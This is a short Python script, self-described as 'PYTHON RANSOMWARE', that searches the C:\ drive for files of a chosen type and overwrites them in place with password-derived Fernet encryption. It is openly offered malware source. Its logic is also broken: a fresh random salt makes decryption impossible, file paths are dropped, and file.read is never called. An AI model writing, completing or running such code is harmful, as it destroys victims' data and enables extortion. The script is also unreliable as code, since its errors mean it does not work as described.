import cryptography
from cryptography.fernet import Fernet

import hashlib
import os
import secrets
import getpass
import argparse
import base64

def generate_key(password):
    salt = secrets.token_bytes(16)
    derived_key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)
    key = base64.urlsafe_b64encode(derived_key)
    f = Fernet(key)
    return f

def find_files(file_type):
    for parent, _, filenames in os.walk('C:\\'): 
        for filename in filenames:
            if filename.endswith(file_type):
                yield filename

def encrypt(filename, key):
    k = generate_key(password)
    with open(filename, 'rb') as file:
        file_data = file.read()
        encrypted = k.encrypt(file_data)
    with open(filename, 'wb') as file:
        file.write(encrypted)

def decrypt(filename, key):
    k = generate_key(password)
    with open(filename, 'rb') as file:
        encrypted = file.read
    try:
        decrypted = k.decrypt(encrypted)
    except cryptography.fernet.InvalidToken as e:
        print(f"Invalid token, {e} ")
        return
    with open(filename, 'wb') as file:
        file.write(decrypted)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PYTHON RANSOMWARE")
    parser.add_argument("-e", "--encrypt", action="store_true")
    parser.add_argument("-d", "--decrypt", action="store_true")
    parser.add_argument("-f", "--filetype", type=str, help="Specify the file type")
    args = parser.parse_args()
    
    if args.encrypt or args.decrypt:
        password = getpass.getpass("Enter the password: ")
        key = generate_key(password)
    
    if args.encrypt:
        for filename in find_files(args.filetype):
            encrypt(filename, key)
    elif args.decrypt:
        for filename in find_files(args.filetype):
            decrypt(filename, key)
    else:
        raise TypeError("Either --encrypt or --decrypt must be specified.")





